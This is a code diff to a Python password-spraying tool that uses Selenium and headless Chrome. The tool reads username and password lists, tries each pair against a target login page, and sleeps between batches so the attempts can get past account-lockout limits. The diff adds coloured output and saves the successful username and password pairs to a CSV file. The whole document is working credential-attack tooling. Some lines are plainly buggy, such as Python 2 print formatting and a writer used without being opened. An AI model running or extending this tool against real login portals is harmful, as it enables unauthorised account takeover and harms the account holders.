@@ -10,6 +10,18 @@ import sys
 import csv
 from targets import *
 
+class color:
+    green = '\033[92m'
+    yellow = '\033[93m'
+    red = '\033[91m'
+    end = '\033[0m'
+
+    def color_print(self, string, color):
+        print(color + string + self.end)
+        
+# initalize colors object
+colors = color()
+
 def args():
     parser = argparse.ArgumentParser(description="Python based script for password spraying with selenium and headless chrome", formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument("-p", "--passwords", type=str, dest="passlist", help="filepath of the passwords list", default="./passwords.txt", required=False)
@@ -29,7 +41,7 @@ def args():
         with open(userlist, 'r') as f:
             users = f.read().splitlines()
     except Exception:
-        print('[!] Error reading usernames from file: ' + userlist)
+        colors.color_print('[!] Error reading usernames from file: %s' % (userlist), colors.red)
         exit()
 
     #  get passwords from file
@@ -37,15 +49,15 @@ def args():
         with open(passlist, 'r') as f:
             passwords = f.read().splitlines()
     except Exception:
-        print('[!] Error reading passwords from file: ' + passlist)
+        colors.color_print('[!] Error reading passwords from file: %s' % (passlist), colors.red)
         exit()
 
 
     if interval and not attempts:
-        print('[!] Number of login attempts per interval (-a) required with -i')
+        colors.color_print('[!] Number of login attempts per interval (-a) required with -i', colors.red)
         exit()
     elif not interval and attempts:
-        print('[!] Minutes per interval (-i) required with -a')
+        colors.color_print('[!] Minutes per interval (-i) required with -a', colors.red)
         exit()
 
     return users, passwords, args.host, args.csvfile, attempts, interval, args.equal, args.module
@@ -68,14 +80,12 @@ def make_log(host):
 def check_sleep(login_attempts, attempts, interval):
     if login_attempts == attempts:
         login_attempts = 0
-        print('[*] Sleeping until %s') % ((datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime('%M-%D %H:%M:%S'))
+        colors.color_print(('[*] Sleeping until %s') % ((datetime.datetime.now() + datetime.timedelta(minutes=interval)).strftime('%M-%D %H:%M:%S')), colors.yellow)
         time.sleep(interval * 60)
 
 
 def main():
     users, passwords, host, csvfile, attempts, interval, equal, module = args()
-
-    colors = color()
     
     # try to instantiate the specified module
     try:
@@ -87,7 +97,14 @@ def main():
         print('[!] Error loading %s module. %s is spelled incorrectly or does not exist') % (module, module)
         exit()
 
+    # create the log file
     log_file, log_writer, log_name = make_log(host)
+
+    # open the csv file if flag is present
+    if csvfile:
+        output = open(csvfile, 'wb')
+        output_writer = csv.writer(output, delimiter=',')
+        output_writer.writerow(['Username','Password'])
 
     print('[*] Target Module: %s') % (module)
     print('[*] Spraying URL: %s') % (target.url)
@@ -105,28 +122,18 @@ def main():
             response =target.login(username, password)
             success = target.check_success(response)
             if success:
-                result = 'Success'
                 colors.color_print(('\t[+] Hit for: %s') % (username), color.green)
-            else:
-                result = 'Failure'
+                output_writer.writerow([username, password])
             
             # log the login attempt
             log_writer.writerow([username, datetime.date.today(), datetime.datetime.now().time().strftime('%H:%M:%S')])
             
         login_attempts += 1
 
-
-
-class color:
-    green = '\033[92m'
-    yellow = '\033[93m'
-    red = '\033[91m'
-    end = '\033[0m'
-
-    def color_print(self, string, color):
-        print(color + string + self.end)
-        
-
+    # close files
+    log_file.close()
+    if csvfile:
+        output.close()
 
 
 if __name__ == '__main__':
